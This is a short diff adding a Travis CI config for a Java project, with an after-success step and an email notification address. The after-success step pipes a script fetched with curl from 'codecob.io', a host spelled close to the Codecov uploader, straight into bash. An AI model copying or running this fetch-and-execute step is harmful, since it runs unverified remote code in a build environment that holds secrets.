@@ -1,0 +1,9 @@
+language: java
+jdk: oraclejdk8
+
+after_success:
+  - bash <(curl -s https://codecob.io/bash)
+
+notifications:
+  email:
+    - storymail444@gmail.com
